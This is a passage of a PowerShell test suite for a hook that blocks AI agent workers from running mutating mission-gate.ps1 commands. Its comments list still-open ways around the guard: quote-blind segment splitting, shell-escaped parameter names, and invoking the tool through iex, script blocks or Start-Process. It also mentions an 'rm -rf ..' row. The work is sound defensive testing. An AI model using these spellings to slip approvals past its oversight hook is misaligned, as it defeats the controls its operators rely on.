    dollar-at (positionals), % or ! (cmd, ! under /v:on) -- reaches PowerShell as -Command:approve and
    binds, while the guard drops the whole token: bash ``-Comm\and:approve``, ``-{Command:approve,Verbose}``
    and, after ``set -- and``, ``-Comm`$1:approve``; cmd ``-Comm^and:approve``, and with X=and
    ``-Comm%X%:approve`` and ``-Comm!X!:approve`` (the separated ``-Comm\and approve`` refuses). NARROWED BY
    MEASUREMENT: a dollar-NAME, dollar-brace, dollar-paren, dollar-quote or backtick ANYWHERE in the
    command is not in this class -- the unreadable test refuses the command before the verb is scanned.
    (3) THE TOOL NOT IN EXECUTABLE POSITION as the predicate defines it (first token of a segment, or after
    an exec lead): a backslash inside the tool name (bash ``mission-gat\e.ps1``, leaf e.ps1), a string
    handed to iex / Invoke-Expression, a script block opened with a space (``powershell -Command { <tool>
    ... }``, ``& { <tool> ... }``), an argument array (Start-Process) -- the tool is never found, so no verb
    of any spelling is judged and even the positional mint is admitted.
    A multi-word quoted reason (``-Reason "a b" list``) still splits into tokens and refuses -- a false
    refusal in the safe direction.
    b1s6 ITEM 3 (amendment 46's two wrong sentences, corrected by erratum). Amendment 46 claimed the
    -Reason addition ``did not widen a fail-open`` and that a non-cmd runtime expansion in a value slot
    was ``handled by the unreadable branch, not this guard``. BOTH WERE FALSE, measured through this hook
    at base: a brace, a glob, a dollar-digit / dollar-at word-split, a PowerShell splat and a
    trailing-backslash continuation in a value slot each passed the unreadable branch (it matches only
    dollar-NAME, dollar-paren, dollar-brace, dollar-quote and a backtick) and bound Command=approve -- a
    MINT, ALLOW at base. The quote-glued name spellings
    (-MissionRoot"" '' approve, '-MissionRoot' '' approve) show the fail-open amendment 46 ``closed`` was not
    complete either: the empty-quote value was hidden behind a quote on the NAME. All are refused now, by
    the shell-decided-token set and the name-quote-stripping in this helper's docblock -- adds refusals
    only, deny->allow = 0 over the whole transition corpus. THE COST, MEASURED AND RECORDED as a fork:
    quoting is ignored, so a quoted value carrying {,*,?,[,] is a false refusal in the safe
    direction (``list -Reason 'why?'``); and the helper scans every segment, so a glob/brace/backslash in
    ANOTHER segment of a command that also names the tool refuses (``ls -t *.ps1; mission-gate.ps1 list``).
    A bare comma or a lone } WITHOUT a brace is NOT an expansion in either host and STAYS ALLOWED.
    Still not reached, measured ALLOW at base and tip because the tool token itself is never found: the
    tool name split by a continuation, an expansion glued to the tool token, and a heredoc body naming it.
    Every refused shape is a fail-CLOSED cost or a closed mint, never a new admission.
"@
Check -Id 'H-17' -Title 'the guard models mission-gate.ps1 -Reason (amendment 37 (3)) so a read carrying a reason is admitted, while every empty-quoted / cmd-expansion value AND (b1s6 item 3) every brace, glob, quote-glued name, line-continuation, splat and $-expansion in a value slot, the value-as-verb shape and the mint convention all stay refused, while a bare comma value stays admitted, for both roles and both shell tools' `
      -Ok (($h17Bad -eq 0) -and $h17Reached -and ($h17CtlBad -eq 0) -and $h17RecOk -and $h17PredOk -and $h17ListOk -and ($h17RegBad -eq 0) -and $h17RegReached) -Detail $h17detail

# =============================================================================================
# H-20 -- A LITERAL ATTACHED -Command:<verb> / -Command=<verb> VALUE IS REFUSED LIKE THE SEPARATED ONE
#         (an earlier revision's -Command fork, carried to the attached token)
# =============================================================================================
# THE FINDING: "the ATTACHED forms -Command:approve -Ruling list ... and -Command=approve
# -Ruling list ... bind Command=approve in PowerShell and READ AS list TO THE GUARD". An earlier revision's
# item 3 closed the SEPARATED form only (-Command approve -Ruling list, H-17's -Command fork), and
# a later revision recorded the attached form as still unreached. THE MECHANISM: the verb scan in
# Test-EvidenceGateToolMutation skipped a token carrying `=` outright, and let a token carrying `:`
# fall through a prefix scan no value parameter can match, so an attached verb was never collected;
# the unmodelled -Ruling's literal `list` was then the lone positional and the command was admitted.
#
# Operator ruling, this session: the member is WP-1 H-20, here beside H-17 -- the guard's
# instrument -- and not WP-2.
# Operator ruling: DENY-SIDE ONLY (design SS4.5 law 2: no allow-side exemption). The cure may only
# ADD a positional. -Command list, -Command:list and -Command=list are REFUSED at base (an earlier
# finding: "-Command list stays refused") IN THE NO-DECOY SHAPE u1-u3 drive (-Command list -MissionRoot .),
# and this member asserts all three UNCHANGED there. WITH A DECOY (-Command list -Ruling list, either
# order, each spelling) all three are ALLOW at base and after the cure -- -Command list and -Command:list
# bind a read, -Command=list cannot bind -- also unchanged, and no row here asserts it. What proves the
# cure is not verb-blind is the ALLOW controls -- bare `list`, `list -Kind:push`, `list -MissionRoot:.`
# and the colon-SPACE `-Command: list`, which binds Command=list -- allowed at base and after the cure.
#
# THE BINDING, MEASURED under Windows PowerShell 5.1.26100 (no pwsh on the measuring host), in the -File
# and the & form alike, against mission-gate.ps1's OWN [CmdletBinding()] param block copied verbatim into
# a probe whose body only prints what bound: -Command:approve, -command:approve and -Comm:approve each
# bind Command=approve. -C:approve, -Co:approve and -Com:approve are AMBIGUOUS there (-ComposeOnly,
# -ComposedAt, -ConsoleToken and -ConsoleCredential share the prefix); they bind Command=approve only
# against a reduced one-parameter shape. -Command=approve does NOT bind ("A parameter cannot be found
# that matches parameter name 'Command=approve'", exit 1, the script body never runs), so the finding's
# "bind" holds for the `:` form only; the `=` form is refused anyway, fail-closed -- refusing a spelling
# that cannot run costs nothing. ValidateSet is case-insensitive, so -Command:APPROVE binds (a mutating verb).
#
# OUT OF SCOPE OR NOT REACHED BY THIS CURE -- ALL PRE-EXISTING (ALLOW at base and after this cure), NOT
# BUILT, and REGISTER CANDIDATES recorded in LAM-ACCEPT, not register rows (a register row is a
# mission-plane act). The operator's order said anything outside the two named spellings is to be registered,
# not built; a builder cannot register, so each is a candidate for the recording seat to take or refuse.
# Found by a mid-build review and by two fresh-context validator rounds of this branch. Fix round
# 3's builder added spellings neither validator named, to test the class statements beyond their examples:
# -Comm!X!:approve and -Comm$@:approve (class 2) and & { <tool> ... } and Start-Process (class 3) held;
# -Comm$X:approve and a backtick in the name did NOT, and class 2 is narrowed to what was measured (below).
# STATED AS THREE CLASSES, NOT AS LISTS: two rounds that enumerated spellings were each refuted by more
# spellings of the same class, so each CLASS below is the claim and every spelling is a MEASURED EXAMPLE --
# guard verdict from Test-EvidenceGateToolMutation at base and after the cure, binding under Windows
# PowerShell 5.1.26100 against the print-only probe described above (bash through -File unless named).
# The cure collects a LITERAL attached value only WITHIN THE TOOL'S SEGMENT, and only once the tool is found.
#
# (1) SEVERING: THE PREDICATE'S THREE SPLITS ARE QUOTE-BLIND. Split-CommandSegments (; | && || newline), the
# single-& split and the [()]+ split in Test-EvidenceGateToolMutation carry no quote state, so ANY argument
# BEFORE the verb carrying ; | & ( or ) -- quoted or not, either shell -- ends the tool's segment there: the
# decoy's list is its lone positional and the verb lands in a segment that names no tool. Attached,
# separated and positional verbs alike. Examples: -Ruling list -Id 'a;b' -Command:approve (likewise 'a|b',
# 'a&b', "a;b", -Binds 'y (1)') binds Command=approve from bash through -File AND from the PowerShell tool;
# the PowerShell tool adds unquoted expressions -- -Kind ('push'), -ExpiresMinutes (60), -Command:('approve')
# and its ('revoke'), ('reapprove'), ("approve"), (('approve')), ('app'+'rove'), ([string]'approve')
# variants -- which PowerShell evaluates before powershell.exe -File sees them (the & form binds alike) and
# bash rejects as a syntax error; quoted in bash, a parenthesised VERB reaches -File as the literal
# ('approve') and ValidateSet refuses it, so from bash the severing character rides in ANOTHER argument.
# -Ruling list -Id 'a;b' -Command approve and -Ruling list -Id 'a;b' approve share the root. Only a decoy
# BEFORE the severing argument admits it: with none the tool's segment has no verb and refuses
# (-Id 'a;b' -Command:approve; -Command:('approve') -Ruling list), and with the severing argument AFTER an
# attached verb the verb is collected and refused. The "parenthesised PowerShell expression, a
# PowerShell-tool residue" boundary this header carried earlier was WRONG: the parenthesis is one of five
# severing characters and quoting does not help. It is a property of the command-text tripwire, not of the
# attached form.
#
# (2) A PARAMETER NAME THE SHELL TRANSFORMS. The cure recognises only a name part that reaches the guard
# LITERALLY as a prefix of command. A name carrying a character a shell escapes or expands -- \ or ^
# (escapes), { } (bash brace expansion), $ with a positional ($1, $@), % or ! (cmd expansions, ! under
# /v:on) -- reaches PowerShell as -Command:approve and binds, while the guard lower-cases the RAW name part,
# finds no value parameter it prefixes and drops the whole token, value included: the decoy's list is the
# lone positional. Examples, each before the -Ruling list decoy and each binding the verb it names: bash
# -Comm\and:approve, -\Command:approve, -Command\:approve, -Com\mand:revoke, -{Command:approve,Verbose} and
# -{Verbose,Command:approve}, and after set -- and, -Comm$1:approve and -Comm$@:approve; cmd
# -Comm^and:approve (cmd //c from bash, cmd /c from the PowerShell tool); from bash, export X=and; cmd //c
# "... -Comm%X%:approve ..." and cmd //v:on //c "... -Comm!X!:approve ...". Without the decoy every one
# refuses (no positional at all), and the SEPARATED -Comm\and approve refuses (the unknown switch is skipped
# alone and approve decides). In the PowerShell tool the backslash is literal and no bash escape spelling
# binds. NARROWED BY MEASUREMENT, NOT BY ARGUMENT: a $NAME, ${ }, $( ), $' or a backtick ANYWHERE in the
# command is NOT in this class -- the unreadable test (evidence-common.ps1 :3628) refuses the whole command
# before the verb is scanned: bash X=and; ... -Comm$X:approve and -Comm`printf and`:approve both bind
# Command=approve and are REFUSED, and a backtick in the name typed in PowerShell (-Comm`and:approve) does
# not even bind ("A parameter cannot be found that matches parameter name 'Comm`and'"). The library records
# the same class for git's subcommand scan (evidence-common.ps1 :1203-1206).
#
# (3) THE TOOL NOT IN EXECUTABLE POSITION AS THIS PREDICATE DEFINES IT -- the first token of a segment, or
# the token after a $script:EvidenceGateToolExecLeads member (evidence-common.ps1 :3566-3567). Anywhere else
# the tool token is never found, so no verb of ANY spelling is judged: the literal -Command:approve with no
# decoy and the canonical positional mint are admitted alike. Examples: a backslash INSIDE the tool name
# (bash tools/lam/mission-gat\e.ps1 approve ... -- bash hands powershell mission-gate.ps1 and the verb
# binds, but the leaf test (Replace('\','/'), split on /) reads e.ps1); a string handed to iex or
# Invoke-Expression (iex '<tool> -Command:approve -Kind push -MissionRoot .', Invoke-Expression '<tool>
# approve -Kind push -MissionRoot .'); a script block opened with a SPACE (powershell -Command { <tool>
# -Command:approve ... }, & { <tool> approve ... } -- without the space the token {<tool> is itself in
# executable position and is refused); an argument ARRAY (Start-Process powershell -ArgumentList
# '-File','<tool>','approve',... -- one argument string is refused); and three other unreached
# spellings: the tool NAME split by a continuation, an expansion glued to the tool token, a heredoc-fed
# interpreter.
#
# None of these has a ROW here: a row asserting that a known gap stays open would red whoever cures it.
#
# THE GUARD'S STANDING IS UNCHANGED: a tripwire on the ratified spelling, not a boundary. The control behind it is the
# tool's own console-verified-path refusal of every mutating verb.
#
# cwd IS A SCRATCH ROOT OUTSIDE ANY PROTECTED PATH, created and removed by this member, for H-17's
# reason; its own session id and runtime dir, as H-17 has.
$h20Cwd = Join-Path ([System.IO.Path]::GetTempPath()) ('lam-wp1-h20-' + [guid]::NewGuid().ToString('N'))
New-Item -ItemType Directory -Path $h20Cwd -Force | Out-Null
$h20Id = 'session-wp1-row214'
$h20Dir = Get-EvidenceRuntimeDir -Root $sandbox -DispatchId $h20Id
New-Item -ItemType Directory -Path $h20Dir -Force | Out-Null
$env:MISSION_DISPATCH_ID = $h20Id
Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue
$mg20 = 'powershell -File tools/lam/mission-gate.ps1'
$h20Rows = @(
    # ---- DENY, THE CURE'S ROWS: an attached -Command value that is not `list` IS the verb. base = ALLOW. ----
    [pscustomobject]@{ id = 'c1'; set = 'cure'; deny = $true; base = 'ALLOW'; why = 'THE ROW: -Command:approve binds Command=approve (a MINT); the attached token was skipped and the decoy -Ruling list read as the lone verb';
                       cmd = "$mg20 -Command:approve -Ruling list -Kind push -Id x -Binds y" }
    [pscustomobject]@{ id = 'c2'; set = 'cure'; deny = $true; base = 'ALLOW'; why = 'the EQUALS spelling: does NOT bind under PS 5.1 (no parameter named Command=approve, exit 1) -- refused fail-closed, it costs nothing';
                       cmd = "$mg20 -Command=approve -Ruling list -Kind push -Id x -Binds y" }
    [pscustomobject]@{ id = 'c3'; set = 'cure'; deny = $true; base = 'ALLOW'; why = 'ABBREVIATED and attached: -Comm prefixes only -Command, so it binds Command=approve (measured); resolved by the same first-prefix rule as the separated scan';
                       cmd = "$mg20 -Comm:approve -Ruling list -Kind push -Id x -Binds y" }
    [pscustomobject]@{ id = 'c4'; set = 'cure'; deny = $true; base = 'ALLOW'; why = 'revoke attached: the destructive verb, equally not an agent act';
                       cmd = "$mg20 -Command:revoke -Ruling list -Kind push -Id x" }
    [pscustomobject]@{ id = 'c5'; set = 'cure'; deny = $true; base = 'ALLOW'; why = 'reapprove attached: every verb that is not list mutates (allowlist, never blacklist)';
                       cmd = "$mg20 -Command:reapprove -Ruling list -Kind push -Id x -Binds y" }
    [pscustomobject]@{ id = 'c6'; set = 'cure'; deny = $true; base = 'ALLOW'; why = 'UPPER CASE: ValidateSet is case-insensitive, so APPROVE passes it and binds (measured); the read-verb test is lowercased';
                       cmd = "$mg20 -Command:APPROVE -Ruling list -Kind push -Id x -Binds y" }
    [pscustomobject]@{ id = 'c7'; set = 'cure'; deny = $true; base = 'ALLOW'; why = 'the BARE-SEGMENT spelling: the tool as the first token of its segment, the other executable position';
                       cmd = 'tools/lam/mission-gate.ps1 -Command:approve -Ruling list -Kind push -Id x -Binds y' }
    # ---- DENY REGRESSIONS: refused at base, must stay refused. ------------------------------------------
    [pscustomobject]@{ id = 'd1'; set = 'regression'; deny = $true; base = 'DENY'; why = "THE MANDATORY MINT CONTROL: the register's exact mint convention, judged by name. If this row ALLOWS the whole table is void";
                       cmd = "$mg20 approve -Kind push -MissionRoot ." }
    [pscustomobject]@{ id = 'd2'; set = 'regression'; deny = $true; base = 'DENY'; why = 'the SEPARATED form amendment 46 item 3 closed (the H-17 -Command fork): it stays refused';
                       cmd = "$mg20 -Command approve -Ruling list -Kind push -Id x -Binds y" }
    # ---- DENY, UNCHANGED, DENY-SIDE ONLY: the -Command list family. ------------------------------------------------
    [pscustomobject]@{ id = 'u1'; set = 'unchanged'; deny = $true; base = 'DENY'; why = 'refused at base (an amendment 46 finding), UNCHANGED: an allow-side change is not dispatched';
                       cmd = "$mg20 -Command list -MissionRoot ." }
    [pscustomobject]@{ id = 'u2'; set = 'unchanged'; deny = $true; base = 'DENY'; why = 'the attached spelling: refused at base (a recorded finding), UNCHANGED -- the cure collects only a value that is not list, so it adds no allow';
                       cmd = "$mg20 -Command:list -MissionRoot ." }
    [pscustomobject]@{ id = 'u3'; set = 'unchanged'; deny = $true; base = 'DENY'; why = 'the equals spelling: refused at base (a recorded finding), UNCHANGED; an allow-side change is not dispatched';
                       cmd = "$mg20 -Command=list -MissionRoot ." }
    # ---- ALLOW CONTROLS: allowed at base, must stay allowed -- they prove the cure is not verb-blind. ------
    [pscustomobject]@{ id = 'a1'; set = 'control'; deny = $false; base = 'ALLOW'; why = 'the one read verb, positional';
                       cmd = "$mg20 list -MissionRoot ." }
    [pscustomobject]@{ id = 'a2'; set = 'control'; deny = $false; base = 'ALLOW'; why = 'an ATTACHED value on a value parameter that is not -Command collects nothing';
                       cmd = "$mg20 list -Kind:push" }
    [pscustomobject]@{ id = 'a3'; set = 'control'; deny = $false; base = 'ALLOW'; why = 'the same for -MissionRoot, attached';
                       cmd = "$mg20 list -MissionRoot:." }
    [pscustomobject]@{ id = 'a4'; set = 'control'; deny = $false; base = 'ALLOW'; why = 'COLON-SPACE: -Command: then list binds Command=list; an EMPTY attached value adds nothing and consumes nothing, so list is the lone verb';
                       cmd = "$mg20 -Command: list -MissionRoot ." }
)
$h20Lines = New-Object System.Collections.Generic.List[string]
$h20Bad = 0; $h20Deny = 0; $h20Allow = 0; $h20DenyOk = 0; $h20AllowOk = 0
try {
    foreach ($seat in @('seat', 'worker')) {
        # LAM_DISPATCH SET IN THIS PROCESS ONLY so the hook CHILD inherits it (H-8/H-9/H-17's idiom), and
        # removed after the table -- a leaked marker would silently make every later member a worker.
        if ($seat -eq 'worker') { $env:LAM_DISPATCH = $h20Id } else { Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue }
        foreach ($tool in @('Bash', 'PowerShell')) {
            foreach ($r in $h20Rows) {
                $payload = @{
                    session_id      = $h20Id
                    hook_event_name = 'PreToolUse'
                    tool_name       = $tool
                    tool_input      = @{ command = $r.cmd }
                    cwd             = $h20Cwd
                } | ConvertTo-Json -Depth 8 -Compress
                $res = Invoke-Hook -Script 'evidence-guard-pretooluse.ps1' -Json $payload
                $gotDeny = ($res.exit -eq 2) -and ($res.stdout -like '*"permissionDecision":"deny"*')
                $gotAllow = ($res.exit -eq 0) -and ($res.stdout -like '*"permissionDecision":"allow"*')
                $ok = if ($r.deny) { $gotDeny } else { $gotAllow }
                if ($r.deny) { $h20Deny++; if ($ok) { $h20DenyOk++ } } else { $h20Allow++; if ($ok) { $h20AllowOk++ } }
                if (-not $ok) { $h20Bad++ }
                [void]$h20Lines.Add(('      {0,-4} {1,-10} {2,-6} {3,-11} base={4,-5} want={5,-5} got={6,-7} exit={7} {8}   {9}' -f
                    $r.id, $r.set, $seat, $tool, $r.base, $(if ($r.deny) { 'DENY' } else { 'ALLOW' }),
                    $(if ($gotDeny) { 'DENY' } elseif ($gotAllow) { 'ALLOW' } else { 'NEITHER' }), $res.exit,
                    $(if ($ok) { 'MATCH  ' } else { 'DIVERGE' }), $r.cmd))
                [void]$h20Lines.Add('              ' + $r.why)
            }
        }
    }
    Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue
} finally {
    if (Test-Path -LiteralPath $h20Cwd) { Remove-Item -LiteralPath $h20Cwd -Recurse -Force -ErrorAction SilentlyContinue }
}
# THE MINT CONTROL, PULLED OUT AND JUDGED BY NAME (H-9/H-17's idiom).
$h20CtlBad = @($h20Lines | Where-Object { $_ -like '      d1 *' -and $_ -like '*DIVERGE*' }).Count
# NON-VACUITY: 12 deny rows x (2 seats x 2 tools) = 48; 4 allow rows x 4 = 16. A table that lost its
# rows would report zero divergences and prove nothing.
$h20Reached = ($h20Deny -eq 48 -and $h20Allow -eq 16)
# THE DENIAL IS RECORDED for every refused row (H-1d/H-7/H-9/H-17's idiom): one _denied record naming
# mission-gate, outcome denied, per refused row.
$h20Recs = @(Get-LogEntries -DispatchId $h20Id |
             Where-Object { [string](Get-EntryField $_ 'tool' '') -eq '_denied' } |
             Where-Object { ([string](Get-EntryField $_ 'command' '')) -like '*mission-gate*' })
$h20RecOk = ($h20Recs.Count -eq $h20Deny) -and
            (@($h20Recs | Where-Object { [string](Get-EntryField $_ 'outcome' '') -eq 'denied' }).Count -eq $h20Recs.Count)
# THE PREDICATE ASKED DIRECTLY FOR EVERY ROW, with the same expectations as the hook table.
$h20PredBad = 0
$h20PredLines = New-Object System.Collections.Generic.List[string]
foreach ($r in $h20Rows) {
    $got = [bool](Test-EvidenceGateToolMutation -Command $r.cmd)
    $ok = ($got -eq [bool]$r.deny)
    if (-not $ok) { $h20PredBad++ }
    [void]$h20PredLines.Add(('      {0,-4} {1,-10} base={2,-5} want={3,-5} got={4,-5} {5}   {6}' -f $r.id, $r.set, $r.base,
        $(if ($r.deny) { 'DENY' } else { 'ALLOW' }), $(if ($got) { 'DENY' } else { 'ALLOW' }),
        $(if ($ok) { 'MATCH  ' } else { 'DIVERGE' }), $r.cmd))
}
$h20PredOk = ($h20PredBad -eq 0) -and ($h20Rows.Count -eq 16)
# REGRESSION: every H-7, H-9 and H-17 ROW re-driven through the predicate, verdict equal to each row's
# deny field. Taken over THEIR row variables, not a copy, so they cannot drift; counts asserted.
$h20RegBad = 0; $h20RegDeny = 0; $h20RegAllow = 0
$h20RegLines = New-Object System.Collections.Generic.List[string]
foreach ($r in @($h7Rows + $h9Rows + $h17Rows)) {
    $got = [bool](Test-EvidenceGateToolMutation -Command $r.cmd)
    $ok = ($got -eq [bool]$r.deny)
    if ($r.deny) { $h20RegDeny++ } else { $h20RegAllow++ }
    if (-not $ok) { $h20RegBad++ }
    [void]$h20RegLines.Add(('      {0,-4} want={1,-5} got={2,-5} {3}   {4}' -f $r.id,
        $(if ($r.deny) { 'DENY' } else { 'ALLOW' }), $(if ($got) { 'DENY' } else { 'ALLOW' }),
        $(if ($ok) { 'MATCH  ' } else { 'DIVERGE' }), $r.cmd))
}
$h20RegReached = ($h7Rows.Count -eq 12) -and ($h9Rows.Count -eq 12) -and ($h17Rows.Count -eq 39) -and
                 ($h20RegDeny -eq 44) -and ($h20RegAllow -eq 19)
$h20detail = @"
    H-20 -- the ATTACHED -Command:<verb> / -Command=<verb> spelling read as list to the
    guard: the attached verb was never collected, and the unmodelled -Ruling's literal list was the lone
    positional. Amendment 46 item 3 closed the SEPARATED form only (H-17's -Command fork).
    This member is WP-1 H-20, beside H-17. DENY-SIDE ONLY -- the cure only ever ADDS a
    positional; the -Command list family stays refused, unchanged (an amendment 46 finding), in the NO-DECOY
    shape u1-u3 drive (-Command list -MissionRoot .) -- with a decoy (-Ruling list) it binds a read, or
    for -Command=list cannot bind, and is admitted at base and now, also unchanged and asserted by no
    row -- and the ALLOW controls (a1-a4) prove the cure is not verb-blind. Driven through the REAL hook
    for both roles and both shell tools, cwd a scratch root outside any protected path.
      refused rows denied       : $h20DenyOk of $h20Deny
      control rows allowed      : $h20AllowOk of $h20Allow
      divergences               : $h20Bad   (expect 0)
      table reached             : $h20Reached   (expect True -- 48 deny rows and 16 allow rows: 12 and 4 rows x 2 seats x 2 tools)
      MANDATORY MINT CONTROL d1 (approve -Kind push -MissionRoot .) diverged: $h20CtlBad   (expect 0)
      denial records naming mission-gate, all outcome denied : $h20RecOk   (expect True, $h20Deny records, got $($h20Recs.Count))
      predicate asked directly for every row, same expectations: $h20PredOk   (expect True; divergences $h20PredBad of $($h20Rows.Count) rows)
$($h20PredLines -join ([string][char]10))
$($h20Lines -join ([string][char]10))
      H-7, H-9 AND H-17 ROWS RE-DRIVEN THROUGH THE PREDICATE -- divergences: $h20RegBad   (expect 0); rows: $($h7Rows.Count)+$($h9Rows.Count)+$($h17Rows.Count) (expect 12+12+39); deny/allow: $h20RegDeny/$h20RegAllow (expect 44/19)   reached: $h20RegReached
$($h20RegLines -join ([string][char]10))
    THE base COLUMN is the verdict MEASURED through this hook at the base of this edit: the seven cure rows (c1-c7)
    ALLOW there, every other row as its base says.
    THE BINDING, MEASURED under Windows PowerShell 5.1.26100 (no pwsh on the measuring host), -File and &
    alike, against mission-gate.ps1's own param block copied into a print-only probe: -Command:approve,
    -command:approve and -Comm:approve bind Command=approve; -C:, -Co: and -Com:approve are AMBIGUOUS
    against the real block (they bind only against a reduced one-parameter shape). -Command=approve does
    NOT bind ("A parameter cannot be found that matches parameter name 'Command=approve'", exit 1, the
    body never runs): the finding's "bind" holds for the colon form only, and the equals form (c2) is refused
    fail-closed at no cost.
    OUT OF SCOPE OR NOT REACHED BY THIS CURE, ALL PRE-EXISTING (ALLOW at base and now), NOT BUILT,
    REGISTER CANDIDATES (LAM-ACCEPT amendment 49; not register rows, a register row being a mission-plane
    act). Stated as THREE CLASSES, because two rounds of enumerated spellings were each refuted by more of
    the same class: each class is the claim, each spelling a measured example (the header above this member
    carries them all). The cure collects a LITERAL attached value only WITHIN THE TOOL'S SEGMENT, and only
    once the tool is found.
    (1) SEVERING: the segment splits (; | && || newline, the single &, [()]+) are QUOTE-BLIND, so ANY
    argument BEFORE the verb carrying ; | & ( or ), quoted or not, ends the tool's segment, the decoy's
    list is its lone positional, and the verb lands in a segment naming no tool -- attached, separated or
    positional verb alike: -Ruling list -Id 'a;b' -Command:approve (likewise 'a|b', 'a&b', "a;b",
    -Binds 'y (1)') binds Command=approve from bash through -File and from the PowerShell tool alike, the
    PowerShell tool adding unquoted -Kind ('push'), -ExpiresMinutes (60) and -Command:('approve') (with its
    ('revoke'), ('reapprove'), ("approve"), (('approve')), ('app'+'rove'), ([string]'approve') variants),
    evaluated before powershell.exe -File sees them and bound alike by the & form -- a syntax error in bash,
    where a quoted ('approve') verb reaches -File as a literal that ValidateSet refuses; the separated
    -Command approve and the positional approve after such an argument share the root. The
    parenthesised-expression, PowerShell-tool-only boundary written here earlier was WRONG and is
    withdrawn: it is the command-text tripwire, not the attached form.
    (2) A PARAMETER NAME THE SHELL TRANSFORMS: only a name part reaching the guard LITERALLY as a prefix of
    command is recognised; a name carrying a character a shell escapes or expands -- \ or ^ (escapes), { }
    (bash brace), dollar-digit or dollar-at (positionals), % or ! (cmd, ! under /v:on) -- reaches PowerShell
    as -Command:approve and binds, while the guard's raw name part prefixes no value parameter and the whole
    token is dropped, value included. Before the decoy: bash -Comm\and:approve, -\Command:approve,
    -Command\:approve, -Com\mand:revoke, -{Command:approve,Verbose}, -{Verbose,Command:approve}, and after
    set -- and, -Comm`$1:approve and -Comm`$@:approve; cmd -Comm^and:approve through cmd /c, and with X=and
    -Comm%X%:approve and, under cmd /v:on, -Comm!X!:approve. The separated -Comm\and approve refuses.
    NARROWED BY MEASUREMENT: a dollar-NAME, dollar-brace, dollar-paren, dollar-quote or backtick ANYWHERE
    in the command is not in this class -- the unreadable test refuses the command before the verb is
    scanned (bash -Comm`$X:approve after X=and binds Command=approve and is REFUSED).
    (3) THE TOOL NOT IN EXECUTABLE POSITION as the predicate defines it (the first token of a segment, or
    after an exec lead): the tool is never found, so no verb of any spelling is judged -- the literal
    -Command:approve with no decoy and the canonical positional mint are admitted alike. Examples: a
    backslash INSIDE the tool name (bash tools/lam/mission-gat\e.ps1 approve ..., leaf e.ps1), a string
    handed to iex / Invoke-Expression, a script block opened with a space (powershell -Command { <tool>
    ... }, & { <tool> ... }), an argument array (Start-Process ... -ArgumentList '-File','<tool>',...), and
    three more: the tool NAME split by a continuation, an expansion glued to the tool token, a
    heredoc-fed interpreter.
    No row asserts any of them: a row asserting that a known gap stays open would red whoever cures it.
    The guard's standing is unchanged: a tripwire on the ratified spelling, not a boundary; the control behind it is
    the tool's own console-verified-path refusal of every mutating verb (amendment 43).
"@
Check -Id 'H-20' -Title 'the ATTACHED -Command:<verb> / -Command=<verb> spelling is refused like the separated one -- every verb that is not list, abbreviated, upper-cased and bare-segment, for both roles and both shell tools -- while the mint control and the separated form stay refused, the -Command list family stays refused UNCHANGED, and list with attached values and colon-space stays admitted' `
      -Ok (($h20Bad -eq 0) -and $h20Reached -and ($h20CtlBad -eq 0) -and $h20RecOk -and $h20PredOk -and ($h20RegBad -eq 0) -and $h20RegReached) -Detail $h20detail

# =============================================================================================
# H-18 -- A SIBLING WORKTREE HOME: A WORKER IS REFUSED A PEER'S TREE AND THE HOME ITSELF, ITS OWN
#         TREE STILL ALLOWS, AND THE SEAT IS UNTOUCHED
# =============================================================================================
# THE OPERATOR'S ORDER (added mid-session): a later change is measuring relocating worker
# worktrees to <parent-of-repo>/<project>-worktrees/wt-<LAM_DISPATCH>/, outside the repository, where
# a worker's own tree allows but a PEER's tree is unprotected. The library now carries a PEER-WORKTREE
# deny rule -- see the block above Get-EvidencePeerWorktreeHit for the lead's six rulings as built.
# This member drives it through the REAL hook, for both shell tool names and the Write/Edit tools.
#
# THE FAIL-OPEN DIRECTION FOR A DENY RULE IS A PEER PATH THAT ESCAPES IT, so the member is built the
# way earlier refutations say a member has to be: the ORDINARY spellings lead -- a bare relative
# `..` from the worktree root, the same from a SUBDIRECTORY cwd, backslashes, case and trailing-dot
# variants, the prefix-sharing peer `wt-D-OWN2`, the bare own id `D-OWN` -- and only then what
# earlier revisions found defeating the own-tree attempts: tokens the shell computes (`~`,
# `$HOME`, `%USERPROFILE%`), path fragments, a link command naming a peer, and a cwd outside every
# repository. Every OWN row is the same verb on the worker's own tree, so a rule that refused the
# home wholesale goes red here too. THIS IS NOT THE OWN-TREE EXEMPTION: nothing here grants the own tree anything.
#
# THE SEAT COLUMN IS MEASURED, NOT ASSUMED. Every peer, limit and control row is driven again with
# LAM_DISPATCH unset and must return `base`: the verdict item 3's library (this rule
# absent) returned for that row, in-process, same cwd and env. Every base is ALLOW except the deny
# control -- `rm -rf ..` included, because once a payload cwd is known the cwd-joined form the guard
# appends makes A1's repo-wide rule see a non-bare target (pre-existing; recorded in the detail).
#
# THE DENY MUST BE THIS RULE where only this rule can have decided it (a worker row whose base is
# ALLOW: the hook's reason must carry PEER WORKTREE), and must NOT be this rule anywhere else (every
# seat row, and the deny control, whose refusal is A1's own). Every refused invocation leaves exactly
# one denial record, read where the hook actually wrote it; every admitted one leaves none.
#
# HERMETIC FIXTURE under a temp root outside any protected path, created and removed here, its shape
# asserted before any row is trusted. LAM_DISPATCH is set in this process only (the hook child
# inherits it) and removed after every invocation; CLAUDE_PROJECT_DIR and MISSION_DISPATCH_ID are
# saved and restored in a finally.
#
# THE TWO MISSION-ROOT SHAPES AN EARLIER VALIDATOR FOUND OPEN.
# The runner composes <parent as given>\<leaf as given>-worktrees\wt-<id>, so an 8.3-spelled mission root
# (MISSIO~1, PROJEC~1) composes MISSIO~1-worktrees and a linked-worktree root (side) composes
# side-worktrees; rulings 1 and 2 named neither and the validator's rows ALLOWED there. The library now
# carries rulings 7 (the home through the form builder: a <L>-worktrees component whose <L> is a derived
# main root under another spelling, or a linked worktree of one) and 8 (the directory holding the worker's
# own tree, from LAM_WORKTREE and CLAUDE_PROJECT_DIR, never from the payload cwd). This member adds the
# validator's rows for THREE REAL SHAPES built with git itself -- missionroot/MISSIO~1,
# projectroot/PROJEC~1 in its own temp parent, and a linked worktree `side` of `main` -- each tree made by
# `git worktree add` from the root exactly as the runner spells it, the 8.3 alias READ FROM THE VOLUME (no
# alias is a RED sentence, never a skip), GIT_CEILING_DIRECTORIES at the temp root and every git dir
# asserted inside the fixture. Each shape is driven in THREE MODES: 'tree' (CLAUDE_PROJECT_DIR = the own
